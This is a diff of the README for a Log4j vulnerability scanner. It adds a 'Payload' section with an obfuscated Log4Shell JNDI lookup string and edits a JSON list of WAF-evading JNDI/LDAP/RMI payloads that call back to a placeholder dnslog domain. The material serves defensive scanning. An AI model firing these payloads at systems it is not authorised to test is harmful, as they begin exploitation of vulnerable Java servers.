@@ -109,7 +109,15 @@ Log4jScanner
         dnslog-result-20211217-1518.txt
 ```
 
-## payloads
+## Payload
+
+**Dedault payload**
+
+```
+${${lower:${::::::::::-j}${upper:n}${lower:d}${upper:i}:${lower:l}${::::::::::-d}${lower:a}${::::::::::-p}://payload_id.pp.ns.dnslog.domain/status}}
+```
+
+**Optional payloads**
 
 ```json
 {
@@ -143,7 +151,7 @@ Log4jScanner
     "31":"${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:RMI}${sys:path.separator}${sys:file.separator}${sys:file.separator}payload_id.dnslog.domain${sys:file.separator}status}",
     "32": "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap$ {env:NaN:-:}//payload_id.dnslog.domain/status}",
     "33": "${jn${env::-}di:${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
-    "34": "${jn${date:}di${date:":"}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
+    "34": "${jn${date:}di${date:\":\"}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
     "35": "${j${k8s:k5:-ND}i${sd:k5:-:}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
     "36": "${j${main:k5:-Nd}i${spring:k5:-:}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
     "37": "${j${sys:k5:-nD }${lower:i${web:k5:-:}}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
